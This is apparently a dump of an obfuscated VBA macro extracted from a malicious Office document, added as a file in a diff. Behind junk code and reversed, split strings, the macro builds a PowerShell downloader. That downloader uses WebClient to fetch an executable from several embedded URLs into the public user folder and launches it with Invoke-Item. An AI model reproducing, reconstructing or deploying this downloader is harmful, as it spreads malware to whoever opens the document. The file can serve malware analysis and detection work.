@@ -1,0 +1,317 @@
+Filename     : ./macros/91d6a575782c9957447fb520a693d45941a862a4abf23a1edb5b2637ab208cc3
+OLE stream   : Macros/VBA/HKaXrwPZBTn
+VBA filename : HKaXrwPZBTn.bas
+----------------------------------------
+Attribute VB_Name = "HKaXrwPZBTn"
+Sub RVsRc(nrQIp)
+Select Case zvJEjW
+         Case 57096
+            ZoNtj = rsVwq
+            UnmbE = Round(35481)
+            TuKPzU = Hex(XwnKti - ChrW(PjcIwl))
+            fvWRS = RMJiA
+         Case 26387
+            JdOZN = CByte(48180)
+            mvEKFL = Log(FEJSGj)
+End Select
+End Sub
+Function rTWESTwpdIFfRL()
+On Error Resume Next
+Select Case GBDPmU
+         Case 7497
+            vrpwsH = iVVVPl
+            FzYdJb = Round(97153)
+            jhUUAd = Hex(lUWJi - ChrW(CSFhm))
+            pThMz = NvFrIL
+         Case 54120
+            TIHiXH = CByte(20289)
+            jBzGGd = Log(fSwXJ)
+End Select
+HGszMPBlR = IjqfRI("liU'oc.'+'ria'+'dnilb//'+':ptth@/0Mj'+'v'+'e/ed.uagenno'+'w-mi-ei'+'medak'+'a'+'//:pvVWEi", 29791 - 29791 + 6 + 29791 - 29791, 29791 - 29791 + 81 + 29791 - 29791)
+Select Case IBVWa
+         Case 73616
+            zuMLhC = uLbJfH
+            jfMro = Round(70204)
+            aZMnST = Hex(GlHzU - ChrW(dppnZE))
+            JUrmsC = YWIfmB
+         Case 80050
+            VAYOi = CByte(73289)
+            ZTMKik = Log(qZSjDj)
+End Select
+Select Case fYqjiF
+         Case 57209
+            EoosG = aPHttw
+            crWLq = Round(84561)
+            XwBPwN = Hex(aWLkCb - ChrW(KUjoh))
+            nXESB = uDhUV
+         Case 76481
+            qCHmZ = CByte(91038)
+            wAtvJq = Log(iRXpW)
+End Select
+tbXXEfM = IjqfRI("CqYljJ'EcALpeRc- 93]RAhC[,)211]RAhC[+05]RAhC[+15]RAhC[(ecALper-69]RAhC[,)021]RAhC[+501]RAhC[+96]RAhC[(  EcALpeRc-  )'}}'+'{hcta'+'c};k'+'aer'+'b;)CDStk'+'U()p23m'+'etI-ep2'+'3+p23'+'k'+'p23'+'si", 11429 - 11429 + 3 + 11429 - 11429, 11429 - 11429 + 188 + 11429 - 11429)
+Select Case mzAsj
+         Case 27200
+            SctCqw = kRCiHt
+            IniIJK = Round(89254)
+            lJiwi = Hex(rCPDKQ - ChrW(UGqEMB))
+            ROohdV = LWjZDk
+         Case 12335
+            jXsSOs = CByte(30343)
+            fwcNnj = Log(EzIGuW)
+End Select
+Select Case UHvFO
+         Case 62597
+            PnZYS = YCOEH
+            KmHBd = Round(86492)
+            wAaDTB = Hex(bbDQNn - ChrW(fhMbnk))
+            nFijdJ = iMGRM
+         Case 57682
+            VojGXq = CByte(81376)
+            zzrTlf = Log(uaqIt)
+End Select
+lKijLtQaQCC = IjqfRI("USW4,'+'tth'+' p23 ='+' XCDAtkU;)33128'+'2 ,00001(txen.'+'d'+'sadasnt'+'kU '+'= BSNtkU;tne'+'ilCbe'+'W.'+'teN'+'.me'+'tsy'+'S )p23t2", 40727 - 40727 + 2 + 40727 - 40727, 40727 - 40727 + 126 + 40727 - 40727)
+Select Case uvUpr
+         Case 5589
+            OwwBJr = tdUPu
+            qGhsJ = Round(46943)
+            aSjbEk = Hex(bsPQj - ChrW(tiCwqK))
+            WLQFaO = UnObjT
+         Case 18918
+            vQXwZ = CByte(39334)
+            AOEiGG = Log(EjCzf)
+End Select
+Select Case unchW
+         Case 59784
+            tRXPS = FCuQNY
+            cqXLQw = Round(73154)
+            ZVDWM = Hex(nRWrmD - ChrW(vmbwl))
+            lMzjqN = iEPQR
+         Case 50616
+            jTwTtF = CByte(66775)
+            lXYbV = Log(hDwNiE)
+End Select
+Lzwpmi = IjqfRI("P1S2UcU/ed.'+'sserp'+'xretsla/'+'/'+':ptth@/2JX'+'LgOe/ed.msso'+'rga//:ptth@/'+'W'w%", 43507 - 43507 + 3 + 43507 - 43507, 43507 - 43507 + 77 + 43507 - 43507)
+Select Case JaoMI
+         Case 76909
+            iBFaL = VbpHF
+            ITacIO = Round(86015)
+            wATDmV = Hex(XtHHkR - ChrW(ijRwP))
+            FFNpH = whiwjz
+         Case 31050
+            YiiCnq = CByte(34215)
+            ihAVOv = Log(rKJzhr)
+End Select
+Select Case zlzvL
+         Case 1570
+            XYuOMo = zzsrL
+            BjPMzi = Round(88982)
+            oRBmkh = Hex(XEdDwN - ChrW(lrMvRj))
+            MQvlD = QWlwh
+         Case 12588
+            jHscb = CByte(13492)
+            ZsPoO = Log(TvXzB)
+End Select
+uZUsqiHC = IjqfRI("WzoE +'k'+'Sy/'+'ku.gro'+'.d'+'lrow-k'+'rav'+'dr'+'aa'+'//:'+'p'+'t'fa", 83396 - 83396 + 3 + 83396 - 83396, 83396 - 83396 + 63 + 83396 - 83396)
+Select Case NYbBF
+         Case 1549
+            IbBTfV = FzizkU
+            JnUBH = Round(44680)
+            EUwlwT = Hex(jIGmbv - ChrW(vXZjSY))
+            VRYPh = ElHzw
+         Case 56868
+            DGDiiC = CByte(94957)
+            pXMJY = Log(NPuRp)
+End Select
+Select Case iZmqf
+         Case 66468
+            SSqcnv = ZRbISj
+            nSsQv = Round(22095)
+            KwAtt = Hex(tsmEYh - ChrW(FPLiaU))
+            zjAjF = MrGtaj
+         Case 44379
+            IWqiu = CByte(5651)
+            hfWjkn = Log(YGKqb)
+End Select
+QbVIIdzi = IjqfRI("QChlu+'th@/KOS3w0'+'/m'+b5O", 97879 - 97879 + 4 + 97879 - 97879, 97879 - 97879 + 19 + 97879 - 97879)
+Select Case NdwUnw
+         Case 61197
+            lsipK = wtVzfR
+            RAdwUI = Round(21287)
+            zjjIj = Hex(iZVvz - ChrW(mwmrt))
+            JEilLK = FvcSX
+         Case 35421
+            UjlJuh = CByte(52128)
+            STzDi = Log(vVOmCu)
+End Select
+Select Case bdBTWw
+         Case 70202
+            CWSPdq = catSwV
+            wiibl = Round(48443)
+            FDjYs = Hex(Mtuzi - ChrW(juNASJ))
+            zctupq = DfXkv
+         Case 25242
+            MzSir = CByte(71313)
+            SjfvoF = Log(dkdQRB)
+End Select
+oXsPOzBFEQj = IjqfRI("r5'TbXDlZLX", 97927 - 97927 + 8 + 97927 - 97927, 97927 - 97927 + 2 + 97927 - 97927)
+Select Case sMJtiW
+         Case 19852
+            VKCQfW = vRaYHi
+            NzBlka = Round(89022)
+            TdLjTl = Hex(pIOSl - ChrW(VtXZP))
+            pMpsuz = zKszmj
+         Case 75268
+            qZFwDM = CByte(74221)
+            SKotjr = Log(iLUuF)
+End Select
+Select Case OEQBzI
+         Case 45624
+            RBCHPf = Fmicjv
+            whVMiD = Round(87661)
+            kRfjn = Hex(pAKZij - ChrW(iXDilv))
+            rzqzz = Hjfmd
+         Case 39110
+            JQlci = CByte(83326)
+            PmTCB = Log(OOJSi)
+End Select
+iXcJnm = IjqfRI("WY6JKcejbo-p23+p2'+'3w'+'p,", 65212 - 65212 + 2 + 65212 - 65212, 65212 - 65212 + 21 + 65212 - 65212)
+Select Case HjQmai
+         Case 66770
+            mGVXv = hTRmb
+            tuzFdn = Round(91628)
+            HtZNEk = Hex(VtiKt - ChrW(ZOJRwH))
+            ivwXqm = MjKIn
+         Case 74488
+            JsjITL = CByte(95071)
+            amchw = Log(jnohf)
+End Select
+Select Case Uwrdt
+         Case 78244
+            zcWlqV = YCFIV
+            cXiki = Round(40878)
+            BilkKI = Hex(PNzOtT - ChrW(dbwFVa))
+            AINQiw = wRGwXz
+         Case 65662
+            rmaip = CByte(16376)
+            FrOCv = Log(wifIuA)
+End Select
+kFcYAnYhFP = IjqfRI("wDkGN'+'23+p23enp23(. = U'+'YYtkU;modnar )p23tp2'+'3+p23cejbo'+'-wp23+p23ep2'+'3+p23np23(& = dsadasn'+'tkU'(( (NOiSSeRpxe-EKovnIpf", 8226 - 8226 + 3 + 8226 - 8226, 8226 - 8226 + 123 + 8226 - 8226)
+Select Case aYTjJ
+         Case 65054
+            wrPWW = OjKimk
+            qDVCcD = Round(97705)
+            jaqdw = Hex(oTStZH - ChrW(ONbsfA))
+            MXAVJS = WCREG
+         Case 67348
+            MQZsZ = CByte(26490)
+            QrkNds = Log(ptJwDO)
+End Select
+Select Case zpUNc
+         Case 9622
+            oRwSm = pUftn
+            AXqzOi = Round(99885)
+            YjtjiU = Hex(sqqzJ - ChrW(hwruOd))
+            ChcEmU = dHsFjc
+         Case 53313
+            EXPnRK = CByte(93379)
+            ovdrSa = Log(DzBKaq)
+End Select
+KGsrLlG = IjqfRI("pYucrW+p2'+'3ovnIp23(&;)CDStkU'+' ,)(TjJ'+'gNx'+'iEixiEr'+'tSoTTjJ.cfsat'+'k'+'U(TjJe'+'lxiEI'+'Fda'+'OxiElnWxiEoDTjJ.UYYtkU{y'+'rt{)XCDAt'+'k'+'U ni cfisS", 75108 - 75108 + 4 + 75108 - 75108, 75108 - 75108 + 146 + 75108 - 75108)
+Select Case pzKZb
+         Case 72101
+            kOhXwr = iaMfF
+            nIIcc = Round(4869)
+            pGiSA = Hex(ziSdri - ChrW(jEjwU))
+            jfYYo = UmTjoh
+         Case 96083
+            dIijP = CByte(43304)
+            tlMzU = Log(uXjcLI)
+End Select
+Select Case datvM
+         Case 27088
+            czOwbU = qOVjHV
+            hdXihU = Round(60492)
+            YDfEW = Hex(ffKudT - ChrW(DJHdL))
+            nzjXGE = wzVMi
+         Case 88222
+            MYKQWw = CByte(23903)
+            iLpiB = Log(iTQEW)
+End Select
+wmblq = IjqfRI("ztjo@i ) )63w", 15159 - 15159 + 2 + 15159 - 15159, 15159 - 15159 + 6 + 15159 - 15159)
+Select Case sSofZA
+         Case 95837
+            hKzPjY = iwqGN
+            bOYicC = Round(11047)
+            dEIIS = Hex(ujirW - ChrW(idYNa))
+            dKzVZw = uQDQz
+         Case 95038
+            sLEFpH = CByte(33024)
+            NuUzj = Log(wwqLH)
+End Select
+Select Case fOUEsU
+         Case 86840
+            QAKJzj = WlFQNq
+            vcKsz = Round(91826)
+            wiUpVh = Hex(kqJHbq - ChrW(qTqLzo))
+            GETMl = SstzX
+         Case 95013
+            UWqUi = CByte(98380)
+            luwJmA = Log(FIUhz)
+End Select
+OZjWXzjuu = IjqfRI("XjX2wsatkU(hcaerof;)'+'p2'+'3'+'ep2'+'3+p23x'+'e.p23( + BSN'+'tkU +'+' '+'p23dRup23 + cilbu'+'p:vnetkU = CDStkU;)p23@p'+'23('+'tilpS.p23/j'+'IIcjcq", 65071 - 65071 + 4 + 65071 - 65071, 65071 - 65071 + 139 + 65071 - 65071)
+Select Case KpZBc
+         Case 68705
+            aszJj = hfTdVj
+            sjLIJZ = Round(71470)
+            MjYSX = Hex(wizoru - ChrW(UtzmaI))
+            jlfzA = OadQr
+         Case 5231
+            CNJYqL = CByte(76225)
+            AWodlL = Log(qOWjQ)
+End Select
+Select Case ZAjYOZ
+         Case 59607
+            Uoqzba = uVHaZN
+            ClZQw = Round(51401)
+            DtmLR = Hex(KXiSLH - ChrW(RANSj))
+            kfBSiw = Uwvzw
+         Case 56467
+            LQuEl = CByte(19734)
+            jWqpPR = Log(mCYGj)
+End Select
+wbwzjYuY = IjqfRI("lE3H2]RAhC[,'tkU' ecALper-  29]RAhC[,'dRu'  EcALpeRc-43]RAhC[,%", 35377 - 35377 + 2 + 35377 - 35377, 35377 - 35377 + 57 + 35377 - 35377)
+Select Case pjBbD
+         Case 24722
+            SLcfUh = AAFJh
+            GBILd = Round(36416)
+            PiwXsR = Hex(ObPTAY - ChrW(VXuKU))
+            NClzPZ = woaqz
+         Case 70541
+            jjPEmC = CByte(14288)
+            YllIIN = Log(iOAIlT)
+End Select
+jQoAjICiBzrK = zzITJdaBY + """" + PtblHpYSaY
+rTWESTwpdIFfRL = nzoiktia + zLGRtMJLppz + cbivNZfiLuUI + jQoAjICiBzrK + WmPwTtdO + kFcYAnYhFP + iXcJnm + lKijLtQaQCC + HGszMPBlR + QbVIIdzi + uZUsqiHC + Lzwpmi + OZjWXzjuu + KGsrLlG + tbXXEfM + oXsPOzBFEQj + wbwzjYuY + wmblq
+Select Case NPsOm
+         Case 97433
+            YcqKu = wnBBPR
+            pjjQh = Round(10769)
+            rsEYwK = Hex(mvNCH - ChrW(mmMzo))
+            mncuR = Mzjdjc
+         Case 63894
+            wifYRO = CByte(70856)
+            LsozHD = Log(CWjbQS)
+End Select
+End Function
+Sub owowhC(LmEKf)
+Select Case jlUDv
+         Case 48962
+            fkqLMG = MHzPuj
+            VfaajW = Round(42966)
+            IAAZGB = Hex(kGXjn - ChrW(DHcmaR))
+            DnpQz = KGtcO
+         Case 5271
+            EbqKm = CByte(569)
+            sXtrNs = Log(RXzoFF)
+End Select
+End Sub
